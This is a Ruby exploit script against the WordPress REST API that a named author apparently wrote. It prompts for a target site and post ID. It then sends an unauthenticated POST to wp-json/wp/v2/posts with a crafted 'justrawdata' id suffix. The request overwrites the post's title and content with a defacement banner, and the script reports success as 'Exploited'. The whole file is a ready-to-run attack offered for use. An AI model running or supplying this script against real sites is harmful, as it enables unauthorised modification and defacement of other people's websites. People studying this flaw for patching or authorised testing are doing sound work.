# usage : gem install rest-client

require 'rest-client'
require 'json'
puts "Script Made By: Harsith Priyan S"
puts "Enter Target URI (Enter The URL of the site): "
targeturi = gets.chomp
puts "Enter POST ID (Note: The Id in which you have to inject the content): "
postid = gets.chomp.to_i
response = RestClient.post(
    "#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}",
    {

        "id" => "#{postid}justrawdata",
        "title" => "This site is vulnerable for content injection",
        "content" => "<center><h1> Tested By Harsith Sivanandham !?</h1><br><pre>$ This site is vulnerable for wp-json (Rest API) Content injection $</pre></center>",

    }.to_json,
    :content_type => :json,
    :accept => :json
) {|response, request, result| response }

if(response.code == 200)


puts "Done! Exploited '#{targeturi}/index.php/?p=#{postid}'"


else
puts "This site is not vulnaerable for wp-json Rest Api Content injection"
end